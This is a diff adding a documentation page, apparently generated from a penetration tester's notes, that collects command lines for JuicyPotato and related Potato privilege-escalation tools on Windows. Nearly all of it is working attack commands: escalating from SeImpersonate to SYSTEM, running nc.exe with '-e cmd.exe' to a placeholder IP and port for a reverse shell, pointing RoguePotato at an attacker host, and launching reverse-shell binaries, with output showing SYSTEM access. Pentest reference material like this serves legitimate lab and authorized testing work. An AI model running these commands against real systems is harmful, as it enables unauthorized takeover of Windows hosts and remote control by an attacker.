@@ -1,0 +1,70 @@
+---
+title: "JuicyPotato.exe"
+sidebarTitle: "JuicyPotato.exe"
+description: "Commands and examples collected from your JuicyPotato.exe notes."
+keywords: ["JuicyPotato.exe", "JuicyPotatoNG.exe"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/juicypotato.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=juicypotato) · [All tools](/index)
+
+## JuicyPotatoNG
+
+**Notebook example**
+
+```powershell
+JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)">
+
+### A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: PrintSpoofer (uses the print spooler / RPC)
+.\PrintSpoofer64.exe -i -c cmd.exe
+:: GodPotato (DCOM; very reliable on Server 2016–2022) — pick the .NET version present
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"           :: -> nt authority\system
+:: alternatives if those are blocked:
+.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
+.\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
+.\EfsPotato.exe "cmd /c whoami"
+```
+
+</Accordion>
+
+<Accordion title="Juicy Potato (Abusing the golden privileges)">
+
+### Juicy Potato (Abusing the golden privileges)
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
+JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
+    Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
+    ......
+    [+] authresult 0
+    {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
+    [+] CreateProcessWithTokenW OK
+```
+
+</Accordion>
+
+</AccordionGroup>
